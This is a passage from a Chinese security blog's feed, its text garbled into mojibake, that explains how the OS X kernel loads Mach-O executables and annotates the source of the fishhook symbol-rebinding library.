class="comment">//å°†å†…å­˜è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œï¼Œç”¨æ¥é˜²æ­¢æº¢å‡ºæ¼æ´çš„åˆ©ç”¨</span></span><br><span class="line">	<span class="keyword">if</span> ((header-&gt;flags &amp; MH_NO_HEAP_EXECUTION) &amp;&amp; !(imgp-&gt;ip_flags &amp; IMGPF_ALLOW_DATA_EXEC))</span><br><span class="line">		vm_map_disallow_data_exec(<span class="built_in">map</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Compute a random offset for ASLR, and an independent random offset for dyld.</span><br><span class="line">	 */</span></span><br><span class="line">  	<span class="comment">//åœ°å€éšæœºï¼Œè®¡ç®—ASLRçš„åç§»é‡</span></span><br><span class="line">	<span class="keyword">if</span> (!(imgp-&gt;ip_flags &amp; IMGPF_DISABLE_ASLR)) &#123;</span><br><span class="line">		<span class="keyword">uint64_t</span> max_slide_pages;</span><br><span class="line"></span><br><span class="line">		max_slide_pages = vm_map_get_max_aslr_slide_pages(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">		aslr_offset = random();</span><br><span class="line">		aslr_offset %= max_slide_pages;</span><br><span class="line">		aslr_offset &lt;&lt;= vm_map_page_shift(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">		dyld_aslr_offset = random();</span><br><span class="line">		dyld_aslr_offset %= max_slide_pages;</span><br><span class="line">		dyld_aslr_offset &lt;&lt;= vm_map_page_shift(<span class="built_in">map</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!result)</span><br><span class="line">		result = &amp;myresult;</span><br><span class="line"></span><br><span class="line">	*result = load_result_null;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//è§£æmachoçš„æ–‡ä»¶æ ¼å¼</span></span><br><span class="line">	lret = parse_machfile(vp, <span class="built_in">map</span>, thread, header, file_offset, macho_size,</span><br><span class="line">	                      <span class="number">0</span>, (<span class="keyword">int64_t</span>)aslr_offset, (<span class="keyword">int64_t</span>)dyld_aslr_offset, result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (lret != LOAD_SUCCESS) &#123;</span><br><span class="line">		<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">			vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>(lret);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * On x86, for compatibility, don't enforce the hard page-zero restriction for 32-bit binaries.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) == <span class="number">0</span>) &#123;</span><br><span class="line">		enforce_hard_pagezero = FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Check to see if the page zero is enforced by the map-&gt;min_offset.</span><br><span class="line">	 */</span> </span><br><span class="line">	<span class="keyword">if</span> (enforce_hard_pagezero &amp;&amp;</span><br><span class="line">	    (vm_map_has_hard_pagezero(<span class="built_in">map</span>, <span class="number">0x1000</span>) == FALSE)) &#123;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">				vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> (LOAD_BADMACHO);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 *	Commit to new map.</span><br><span class="line">	 *</span><br><span class="line">	 *	Swap the new map for the old, which  consumes our new map</span><br><span class="line">	 *	reference but each leaves us responsible for the old_map reference.</span><br><span class="line">	 *	That lets us get off the pmap associated with it, and</span><br><span class="line">	 *	then we can release it.</span><br><span class="line">	 */</span></span><br><span class="line">	 <span class="comment">//ç”¨æ–°ç”³è¯·çš„å†…å­˜æ›¿æ¢åŸæ¥çš„å†…å­˜</span></span><br><span class="line">	 <span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">		<span class="comment">/*</span><br><span class="line">		 * If this is an exec, then we are going to destroy the old</span><br><span class="line">		 * task, and it's correct to halt it; if it's spawn, the</span><br><span class="line">		 * task is not yet running, and it makes no sense.</span><br><span class="line">		 */</span></span><br><span class="line">	 	<span class="keyword">if</span> (!spawn) &#123;</span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 * Mark the task as halting and start the other</span><br><span class="line">			 * threads towards terminating themselves.  Then</span><br><span class="line">			 * make sure any threads waiting for a process</span><br><span class="line">			 * transition get informed that we are committed to</span><br><span class="line">			 * this transition, and then finally complete the</span><br><span class="line">			 * task halting (wait for threads and then cleanup</span><br><span class="line">			 * task resources).</span><br><span class="line">			 *</span><br><span class="line">			 * <span class="doctag">NOTE:</span> task_start_halt() makes sure that no new</span><br><span class="line">			 * threads are created in the task during the transition.</span><br><span class="line">			 * We need to mark the workqueue as exiting before we</span><br><span class="line">			 * wait for threads to terminate (at the end of which</span><br><span class="line">			 * we no longer have a prohibition on thread creation).</span><br><span class="line">			 * </span><br><span class="line">			 * Finally, clean up any lingering workqueue data structures</span><br><span class="line">			 * that may have been left behind by the workqueue threads</span><br><span class="line">			 * as they exited (and then clean up the work queue itself).</span><br><span class="line">			 */</span></span><br><span class="line">			kret = task_start_halt(task);</span><br><span class="line">			<span class="keyword">if</span> (kret != KERN_SUCCESS) &#123;</span><br><span class="line">				vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">				<span class="keyword">return</span> (LOAD_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line">			proc_transcommit(p, <span class="number">0</span>);</span><br><span class="line">			workqueue_mark_exiting(p);</span><br><span class="line">			task_complete_halt(task);</span><br><span class="line">			workqueue_exit(p);</span><br><span class="line">			kqueue_dealloc(p-&gt;p_wqkqueue);</span><br><span class="line">			p-&gt;p_wqkqueue = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		old_map = swap_task_map(old_task, thread, <span class="built_in">map</span>, !spawn);</span><br><span class="line">		vm_map_deallocate(old_map);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>(LOAD_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå‡½æ•°ä¸»è¦åšäº†<code>macho</code>æ–‡ä»¶è§£æä¹‹å¤–å…¶ä»–æ‰€æœ‰å’ŒåŠ è½½ç›¸å…³çš„å·¥ä½œã€‚</p>
<ul>
<li>å¯¹æ–°çš„taskåšäº†å†…å­˜çš„åˆ†é…</li>
<li>åŠ å¼ºå®‰å…¨æ–¹é¢çš„è®¾ç½®ä¸»è¦æ˜¯<code>DEP</code>å’Œ<code>ASRL</code></li>
<li>è°ƒç”¨å‡½æ•°è§£æmachoæ–‡ä»¶</li>
<li>è§£ææˆåŠŸä¹‹åï¼Œç”¨æ–°ç”³è¯·çš„å†…å­˜æ›¿æ¢æ—§çš„å†…å­˜ã€‚</li>
</ul>
<h2 id="1-5_parse_machfile">1.5 parse_machfile</h2><p>è¿™ä¸ªå‡½æ•°åšçš„äº‹æƒ…å°±éå¸¸çš„ç®€å•æ¸…æ¥šäº†ï¼Œå°±æ˜¯å°†<code>macho</code>æ–‡ä»¶è§£æï¼Œå¹¶ä¸”æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚</p>
<p>åœ¨æˆ‘çš„<a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/#0x03_Load_Commands">machoæ–‡ä»¶æ ¼å¼åˆ†æ</a>ä¸­å·²ç»åˆ†æè¿‡è¿™ä¸€å—ä»£ç äº†ã€‚è¿™é‡Œå°±ä¸å¤è¿°äº†ã€‚</p>
<h1 id="0x02_å°ç»“">0x02 å°ç»“</h1><p>é€šè¿‡å¯¹æ•´ä¸ªæµç¨‹æºç çš„ä¸€æ¬¡ç®€å•æ¢³ç†ï¼Œå¤§è‡´æ˜ç™½äº†æ•´ä¸ªæµç¨‹åœ¨æºç ä¸­æ˜¯æ€ä¹ˆæ ·å®ç°çš„ï¼Œåœ¨ç ”ç©¶è¿™æ–¹é¢çš„æ¼æ´çš„æ—¶å€™å¯ä»¥æ›´å¿«çš„æ˜ç™½é—®é¢˜å‡ºåœ¨å“ªé‡Œï¼Œä¹Ÿå¯èƒ½æ›´æ·±åˆ»çš„ç†è§£æ¼æ´çš„æˆå› ä»¥åŠé‡ç°çš„æ–¹æ³•ã€‚</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>â€‹    ç ”ç©¶<code>OS X</code>å®‰å…¨æ–¹é¢çš„çŸ¥è¯†éœ€è¦å¯¹<code>mach-o</code>åŠ è½½çš„æµç¨‹éœ€è¦æœ‰ä¸€ä¸ªæ¯”è¾ƒå®Œæ•´çš„ç†è§£ï¼Œæ–­æ–­ç»­ç»­ä¸€ä¸ªæœˆçš„æ—¶é—´é‡Œé¢ï¼Œé€šè¿‡å¯¹æºç çš„é˜…è¯»å¯¹<code>mach-o</code>çš„åŠ è½½æœ‰ä¸€ä¸ªæ¯”è¾ƒåŸºæœ¬çš„è®¤è¯†ï¼Œåœ¨é‡åˆ°å„ä¸ªå…·ä½“çš„é—®é¢˜æ˜¯æ‰èƒ½æ›´å¥½çš„ç†è§£å’Œæ“ä½œã€‚</p>
<p>â€‹    å…¶ä»–ç›¸å…³æ–‡ç« å¯ä»¥çœ‹è¿™é‡Œï¼ŒåŸºæœ¬æ¶µç›–äº†ä»å†…æ ¸æ€åˆ°åº”ç”¨å±‚çš„ç›¸å…³æºç çš„ç®€å•åˆ†æã€‚è¿˜æœ‰ä¸è¶³ä¹‹å¤„åœ¨é‡åˆ°ç›¸å…³çš„é—®é¢˜æ—¶ä¹Ÿä¼šåŠ åˆ°è¿™ä¸€ç³»åˆ—æ–‡ç« ä¸­ã€‚</p>
<p>â€‹    1.<a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">mach-oåŠ è½½æµç¨‹å­¦ä¹ -dyldå¯¹ä¸»imageçš„å¤„ç†æµç¨‹</a></p>
<p>â€‹    2.<a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">mach-oåŠ è½½æµç¨‹å­¦ä¹ -dyldå¯¹ä¾èµ–åº“çš„åŠ è½½æµç¨‹</a></p>
<p>â€‹    3.mach-oåŠ è½½æµç¨‹å­¦ä¹ -å†…æ ¸å¯¹mach-oæ–‡ä»¶çš„åŠ è½½æµç¨‹(æœ¬æ–‡)</p>
<p>â€‹    </p>
<p>â€‹    é€šè¿‡ä¸€å¼ å›¾ç‰‡ï¼Œå¯ä»¥æ¯”è¾ƒæ¸…æ¥šçš„ç†è§£æ•´ä¸ªæµç¨‹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="æ•´ä½“æµç¨‹"></p>]]>
    
    </summary>
    
      <category term="OSX" scheme="http://turingh.github.io/tags/OSX/"/>
    
      <category term="execve" scheme="http://turingh.github.io/tags/execve/"/>
    
      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[fishhookæºç åˆ†æ]]></title>
    <link href="http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/03/22/fishhookæºç åˆ†æ/</id>
    <published>2016-03-22T15:14:53.000Z</published>
    <updated>2016-03-24T03:35:54.000Z</updated>
    <content type="html"><![CDATA[<p>æ²¡ä»€ä¹ˆç‰¹åˆ«è¦è¯´çš„ï¼Œè¯¦ç»†çœ‹ä»£ç ï¼Œå¯ä»¥ç»“åˆä¹‹å‰çš„ä¸¤ç¯‡æ–‡ç« ï¼Œæ›´å¥½çš„ç†è§£è¿™éƒ¨åˆ†å†…å®¹ã€‚</p>
<p><a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">mach-oæ ¼å¼åˆ†æ</a></p>
<p><a href="http://BLOGIMAGE/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" target="_blank" rel="external">mach-oå»¶æ—¶ç»‘å®š</a><br><a id="more"></a></p>
<h1 id="æºç ">æºç </h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright (c) 2013, Facebook, Inc.</span></span><br><span class="line"><span class="comment">// All rights reserved.</span></span><br><span class="line"><span class="comment">// Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment">// modification, are permitted provided that the following conditions are met:</span></span><br><span class="line"><span class="comment">//   * Redistributions of source code must retain the above copyright notice,</span></span><br><span class="line"><span class="comment">//     this list of conditions and the following disclaimer.</span></span><br><span class="line"><span class="comment">//   * Redistributions in binary form must reproduce the above copyright notice,</span></span><br><span class="line"><span class="comment">//     this list of conditions and the following disclaimer in the documentation</span></span><br><span class="line"><span class="comment">//     and/or other materials provided with the distribution.</span></span><br><span class="line"><span class="comment">//   * Neither the name Facebook nor the names of its contributors may be used to</span></span><br><span class="line"><span class="comment">//     endorse or promote products derived from this software without specific</span></span><br><span class="line"><span class="comment">//     prior written permission.</span></span><br><span class="line"><span class="comment">// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"</span></span><br><span class="line"><span class="comment">// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span></span><br><span class="line"><span class="comment">// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE</span></span><br><span class="line"><span class="comment">// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span></span><br><span class="line"><span class="comment">// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line"><span class="comment">// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER</span></span><br><span class="line"><span class="comment">// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,</span></span><br><span class="line"><span class="comment">// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE</span></span><br><span class="line"><span class="comment">// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#import <span class="string">"fishhook.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#import &lt;dlfcn.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;string.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/dyld.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/loader.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/nlist.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> __LP64__</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> mach_header_64 <span class="keyword">mach_header_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> segment_command_64 <span class="keyword">segment_command_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> section_64 <span class="keyword">section_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nlist_64 <span class="keyword">nlist_t</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT_64</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> mach_header <span class="keyword">mach_header_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> segment_command <span class="keyword">segment_command_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> section <span class="keyword">section_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nlist <span class="keyword">nlist_t</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span> SEG_DATA_CONST</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> SEG_DATA_CONST  <span class="string">"__DATA_CONST"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> rebindings_entry &#123;</span><br><span class="line">  <span class="keyword">struct</span> rebinding *rebindings;</span><br><span class="line">  <span class="keyword">size_t</span> rebindings_nel;</span><br><span class="line">  <span class="keyword">struct</span> rebindings_entry *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">struct</span> rebindings_entry *_rebindings_head;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">prepend_rebindings</span><span class="params">(<span class="keyword">struct</span> rebindings_entry **rebindings_head,</span><br><span class="line">                              <span class="keyword">struct</span> rebinding rebindings[],</span><br><span class="line">                              size_t nel)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> rebindings_entry *new_entry = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebindings_entry));</span><br><span class="line">  <span class="keyword">if</span> (!new_entry) &#123;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  new_entry-&gt;rebindings = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebinding) * nel);</span><br><span class="line">  <span class="keyword">if</span> (!new_entry-&gt;rebindings) &#123;</span><br><span class="line">    <span class="built_in">free</span>(new_entry);</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(new_entry-&gt;rebindings, rebindings, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebinding) * nel);</span><br><span class="line">  new_entry-&gt;rebindings_nel = nel;</span><br><span class="line">  new_entry-&gt;next = *rebindings_head;</span><br><span class="line">  *rebindings_head = new_entry;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_rebinding_with_section</span><span class="params">(<span class="keyword">struct</span> rebindings_entry *rebindings,</span><br><span class="line">                                           section_t *section,</span><br><span class="line">                                           intptr_t slide,</span><br><span class="line">                                           nlist_t *symtab,</span><br><span class="line">                                           <span class="keyword">char</span> *strtab,</span><br><span class="line">                                           uint32_t *indirect_symtab)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//__la_symbol_ptrçš„reserved1å­—æ®µæ ‡è¯†äº†sectionæè¿°çš„ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­å¼€å§‹çš„index</span></span><br><span class="line">  <span class="comment">//åŠ¨æ€ç¬¦å·è¡¨ä¸­ç¬¬ä¸€ä¸ªéœ€è¦è§£æçš„ç¬¦å· å¼€å§‹åœ°å€</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symbol_indices = indirect_symtab + section-&gt;reserved1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">void</span> **indirect_symbol_bindings = (<span class="keyword">void</span> **)((<span class="keyword">uintptr_t</span>)slide + section-&gt;addr);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; section-&gt;size / <span class="keyword">sizeof</span>(<span class="keyword">void</span> *); i++) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> symtab_index = indirect_symbol_indices[i];</span><br><span class="line">    <span class="keyword">if</span> (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL ||</span><br><span class="line">        symtab_index == (INDIRECT_SYMBOL_LOCAL   | INDIRECT_SYMBOL_ABS)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//è·å–æ¯ä¸€ä¸ªéœ€è¦åŠ¨æ€è§£æçš„ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„åœ°å€</span></span><br><span class="line">    <span class="keyword">uint32_t</span> strtab_offset = symtab[symtab_index].n_un.n_strx;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//é€šè¿‡ç¬¦å·è¡¨ä¸­æ¯ä¸€ä¸ªå¯¼å…¥ç¬¦å·çš„å­—ç¬¦ä¸²è¡¨åç§»é‡è·å–ç¬¦å·å¯¹åº”çš„å­—ç¬¦ä¸²ï¼ˆç¬¦å·çš„åå­—ï¼‰</span></span><br><span class="line">    <span class="keyword">char</span> *symbol_name = strtab + strtab_offset;</span><br><span class="line">    <span class="keyword">struct</span> rebindings_entry *cur = rebindings;</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur-&gt;rebindings_nel; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(symbol_name) &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">            <span class="built_in">strcmp</span>(&amp;symbol_name[<span class="number">1</span>], cur-&gt;rebindings[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">		  <span class="comment">//æ‰¾åˆ°ç›¸åŒçš„å‡½æ•°æ›¿æ¢æŒ‡é’ˆ</span></span><br><span class="line">          <span class="keyword">if</span> (cur-&gt;rebindings[j].replaced != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">              indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">            *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i];</span><br><span class="line">          &#125;</span><br><span class="line">          indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;</span><br><span class="line">          <span class="keyword">goto</span> 